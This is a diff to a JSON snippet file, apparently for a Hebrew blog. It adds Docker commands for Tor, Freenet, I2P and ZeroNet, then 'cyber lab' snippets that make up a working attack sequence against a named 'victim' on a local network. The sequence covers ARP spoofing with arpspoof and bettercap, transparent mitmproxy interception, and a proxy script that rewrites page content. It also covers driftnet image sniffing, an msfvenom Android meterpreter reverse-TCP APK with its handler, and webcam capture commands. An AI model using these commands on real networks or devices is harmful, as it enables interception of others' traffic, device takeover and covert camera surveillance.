@@ -1097,4 +1097,326 @@
   "content": "<pre>\n# Clone this repository\ngit clone https://github.com/electron/electron-quick-start\n\n# Go into the repository\ncd electron-quick-start\n\n# Install dependencies\nnpm install\n\n# Run the app\nnpm start\n</pre>",
   "name": "electron_1",
   "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b19beace0288e56802d2"
+  },
+  "content": "$ docker pull osminogin/tor-simple",
+  "name": "הצד-האחר-של-הרשת-tor_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b1e8eace0288e56802d3"
+  },
+  "content": "$ docker run -d --rm --publish 127.0.0.1:9050:9050 -i osminogin/tor-simple",
+  "name": "הצד-האחר-של-הרשת-tor_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b213eace0288e56802d4"
+  },
+  "content": "$ curl -s --socks5 127.0.0.1:9050 ifconfig.io/all.json | python -m json.tool",
+  "name": "הצד-האחר-של-הרשת-tor_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b24beace0288e56802d5"
+  },
+  "content": "{ \"country_code\": \"T1\", \"encoding\": \"gzip\", \"forwarded\": \"185.220.100.254\", \"ip\": \"185.220.100.254\", \"lang\": \"\", \"method\": \"GET\", \"mime\": \"*/*\", \"port\": 44660, \"referer\": \"\", \"ua\": \"curl/7.58.0\" }",
+  "name": "הצד-האחר-של-הרשת-tor_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b298eace0288e56802d6"
+  },
+  "content": "$ chromium-browser --proxy-server=\"socks://localhost:9050\" --incognito",
+  "name": "הצד-האחר-של-הרשת-tor_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b362eace0288e56802d7"
+  },
+  "content": "$ docker pull nextgens/freenet",
+  "name": "הצד-האחר-של-הרשת-freenet_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b387eace0288e56802d8"
+  },
+  "content": "$ mkdir freenet && cd freenet",
+  "name": "הצד-האחר-של-הרשת-freenet_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b3aeeace0288e56802d9"
+  },
+  "content": "$ docker run -d --rm --name freenet --net=host -v $PWD:/freenet/data nextgens/freenet:latest",
+  "name": "הצד-האחר-של-הרשת-freenet_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b4b9eace0288e56802da"
+  },
+  "content": "$ docker pull ksey/i2pd",
+  "name": "הצד-האחר-של-הרשת-i2p_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b4f2eace0288e56802db"
+  },
+  "content": "$ mkdir i2pd && cd i2pd",
+  "name": "הצד-האחר-של-הרשת-i2p_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b569eace0288e56802dc"
+  },
+  "content": "$ touch i2pd.conf $ touch tunnels.conf",
+  "name": "הצד-האחר-של-הרשת-i2p_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b59beace0288e56802dd"
+  },
+  "content": "$ docker run -d --rm --name i2pd -d -p 7070:7070 -p 4444:4444 -p 4447:4447 -p 7656:7656 -v /$PWD:/var/lib/i2pd ksey/i2pd",
+  "name": "הצד-האחר-של-הרשת-i2p_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b5c9eace0288e56802de"
+  },
+  "content": "$ chromium-browser --proxy-server=\"http://127.0.0.1:4444\" --incognito",
+  "name": "הצד-האחר-של-הרשת-i2p_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b71feace0288e56802df"
+  },
+  "content": "$ docker pull nofish/zeronet",
+  "name": "הצד-האחר-של-הרשת-zeronet_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b741eace0288e56802e0"
+  },
+  "content": "$ mkdir zeronet && cd zeronet",
+  "name": "הצד-האחר-של-הרשת-zeronet_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b770eace0288e56802e1"
+  },
+  "content": "$ docker run -d --rm -e \"ENABLE_TOR=true\" -v $PWD:/root/data -p 15441:15441 -p 127.0.0.1:43110:43110 nofish/zeronet",
+  "name": "הצד-האחר-של-הרשת-zeronet_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b7b0eace0288e56802e2"
+  },
+  "content": "$ chromium-browser --incognito http://127.0.0.1:43110",
+  "name": "הצד-האחר-של-הרשת-zeronet_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b7daeace0288e56802e3"
+  },
+  "content": "$ docker run -d --rm -v $PWD:/root/data -p 15441:15441 -p 127.0.0.1:43110:43110 nofish/zeronet",
+  "name": "הצד-האחר-של-הרשת-zeronet_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b88ceace0288e56802e4"
+  },
+  "content": "$ sudo arp-scan --interface=wlo1 --localnet",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b8b7eace0288e56802e5"
+  },
+  "content": "$ sysctl -w net.ipv4.ip_forward=1",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b913eace0288e56802e6"
+  },
+  "content": "$ iptables -A FORWARD --in-interface wlo1 -j ACCEPT",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b95beace0288e56802e7"
+  },
+  "content": "$ iptables -t nat -A PREROUTING -i wlo1 -p tcp --dport 80 -j REDIRECT --to-port 8080",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b981eace0288e56802e8"
+  },
+  "content": "$ docker run --rm -it --network host dsniff",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b9b2eace0288e56802e9"
+  },
+  "content": "$ arpspoof -i wlo1 -t 192.168.1.4 192.168.1.1",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_6",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407b9ddeace0288e56802ea"
+  },
+  "content": "$ arpspoof -i wlo1 -t 192.168.1.1 192.168.1.4",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_7",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407ba09eace0288e56802eb"
+  },
+  "content": "$ docker run --rm -it -v $PWD:/home/mitmproxy/.mitmproxy --network host mitmproxy/mitmproxy mitmproxy -m transparent",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_8",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407ba36eace0288e56802ec"
+  },
+  "content": "$ iptables -t nat -A PREROUTING -i wlo1 -p tcp --dport 443 -j REDIRECT --to-port 8080\n\n",
+  "name": "מעבדת-סייבר-קריאה-ועריכת-תעבורה-של-קורבן-ברשת_9",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bacbeace0288e56802ed"
+  },
+  "content": "$ docker run --rm -it --privileged --net=host bettercap/bettercap\n",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bb08eace0288e56802ee"
+  },
+  "content": "» net.probe on",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bb74eace0288e56802ef"
+  },
+  "content": "» net.probe off",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bba6eace0288e56802f0"
+  },
+  "content": "» set arp.spoof.targets 192.168.1.8\n» arp.spoof on\n» http.proxy on",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bbcceace0288e56802f1"
+  },
+  "content": "$ docker run --rm -it --env DISPLAY=unix$DISPLAY --network host dsniff driftnet -i wlo1",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bbf5eace0288e56802f2"
+  },
+  "content": "» set net.sniff.verbose false\n» net.sniff on",
+  "name": "מעבדת-סייבר-קריאת-תעבורה-של-קורבן-ברשת-והצגת-תמונות_6",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bcb5eace0288e56802f3"
+  },
+  "content": "$ docker run --rm -it --privileged --net=host -v $PWD:/tmp bettercap/bettercap",
+  "name": "מעבדת-סייבר-3_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bcdceace0288e56802f4"
+  },
+  "content": "» net.probe on",
+  "name": "מעבדת-סייבר-3_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bd00eace0288e56802f5"
+  },
+  "content": "» net.probe off",
+  "name": "מעבדת-סייבר-3_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bd2eeace0288e56802f6"
+  },
+  "content": "» set arp.spoof.targets 192.168.1.3",
+  "name": "מעבדת-סייבר-3_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bd5aeace0288e56802f7"
+  },
+  "content": "» set http.proxy.script /tmp/test.js",
+  "name": "מעבדת-סייבר-3_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407be25eace0288e56802f8"
+  },
+  "content": "<div><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px;white-space:pre-wrap\"><div style=\"line-height:19px\"><div style=\"line-height:19px;white-space:pre-wrap\"><div><span style=\"color:rgb(86,156,214)\">function</span> <span style=\"color:rgb(220,220,170)\">onResponse</span>(<span style=\"color:rgb(156,220,254)\">req</span>, <span style=\"color:rgb(156,220,254)\">res</span>) {</div><div>  <span style=\"color:rgb(86,156,214)\">var</span> <span style=\"color:rgb(156,220,254)\">body</span> = <span style=\"color:rgb(156,220,254)\">res</span>.<span style=\"color:rgb(220,220,170)\">ReadBody</span>();</div><br><div>  <span style=\"color:rgb(197,134,192)\">switch</span> (<span style=\"color:rgb(156,220,254)\">req</span>.<span style=\"color:rgb(156,220,254)\">Path</span>) {</div><div>    <span style=\"color:rgb(197,134,192)\">case</span> <span style=\"color:rgb(206,145,120)\">'/mitm.html'</span>:</div><div>      <span style=\"color:rgb(156,220,254)\">res</span>.<span style=\"color:rgb(156,220,254)\">Body</span> = <span style=\"color:rgb(220,220,170)\">replaceContent</span>(<span style=\"color:rgb(156,220,254)\">body</span>);</div><div>      <span style=\"color:rgb(156,220,254)\">console</span>.<span style=\"color:rgb(220,220,170)\">log</span>(<span style=\"color:rgb(156,220,254)\">res</span>.<span style=\"color:rgb(156,220,254)\">Body</span>);</div><div>      <span style=\"color:rgb(197,134,192)\">break</span>;</div><div>  }</div><div>}</div><br><div><span style=\"color:rgb(86,156,214)\">function</span> <span style=\"color:rgb(220,220,170)\">replaceContent</span>(<span style=\"color:rgb(156,220,254)\">body</span>) {</div><div>  <span style=\"color:rgb(86,156,214)\">var</span> <span style=\"color:rgb(156,220,254)\">regex</span> = <span style=\"color:rgb(86,156,214)\">new</span> <span style=\"color:rgb(78,201,176)\">RegExp</span>(<span style=\"color:rgb(209,105,105)\">/</span><span style=\"color:rgb(206,145,120)\">(</span><span style=\"color:rgb(209,105,105)\">&lt;body&gt;</span><span style=\"color:rgb(206,145,120)\">)(</span><span style=\"color:rgb(209,105,105)\">.</span><span style=\"color:rgb(206,145,120)\">)</span><span style=\"color:rgb(215,186,125)\">*</span><span style=\"color:rgb(209,105,105)\">&lt;</span><span style=\"color:rgb(215,186,125)\">\\/</span><span style=\"color:rgb(209,105,105)\">body&gt;/</span>)<wbr>;</div><div>  <span style=\"color:rgb(197,134,192)\">return</span> <span style=\"color:rgb(156,220,254)\">body</span></div><div>    .<span style=\"color:rgb(220,220,170)\">replace</span>(<span style=\"color:rgb(209,105,105)\">/\\n/</span><span style=\"color:rgb(86,156,214)\">g</span>, <span style=\"color:rgb(206,145,120)\">''</span>)</div><div>    .<span style=\"color:rgb(220,220,170)\">replace</span>(<span style=\"color:rgb(209,105,105)\">/\\r/</span><span style=\"color:rgb(86,156,214)\">g</span>, <span style=\"color:rgb(206,145,120)\">''</span>)</div><div>    .<span style=\"color:rgb(220,220,170)\">replace</span>(<span style=\"color:rgb(156,220,254)\">regex</span>, <span style=\"color:rgb(206,145,120)\">'&lt;body&gt;&lt;h1&gt;YOU HAVE BEEN HACKED&lt;/h1&gt;&lt;/body&gt;'</span>);</div><div>}</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>",
+  "name": "מעבדת-סייבר-3_6",
+  "type": "color"
+},{
+  "_id": {
+    "$oid": "6407be5deace0288e56802f9"
+  },
+  "content": "» arp.spoof on\n» http.proxy on",
+  "name": "מעבדת-סייבר-3_7",
+  "type": "color"
+},{
+  "_id": {
+    "$oid": "6407bef4eace0288e56802fa"
+  },
+  "content": "$ docker run --rm -it -v $PWD:/tmp -p 4444:4444 strm/metasploit",
+  "name": "מעבדת-סייבר-4_1",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bf1ceace0288e56802fb"
+  },
+  "content": "msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.1.8 lport=4444 R > /tmp/msfvenom.apk",
+  "name": "מעבדת-סייבר-4_2",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bf58eace0288e56802fc"
+  },
+  "content": "> use exploit/multi/handler\n> set payload android/meterpreter/reverse_tcp\n> set lhost 192.168.1.8\n> set lport 4444\n> exploit",
+  "name": "מעבדת-סייבר-4_3",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bf92eace0288e56802fd"
+  },
+  "content": "> webcam_list",
+  "name": "מעבדת-סייבר-4_4",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bfb4eace0288e56802fe"
+  },
+  "content": "> webcam_snap -h",
+  "name": "מעבדת-סייבר-4_5",
+  "type": "monochrome"
+},{
+  "_id": {
+    "$oid": "6407bfd0eace0288e56802ff"
+  },
+  "content": "> webcam_snap -i 2 -p /tmp/test123.jpeg",
+  "name": "מעבדת-סייבר-4_6",
+  "type": "monochrome"
 }]
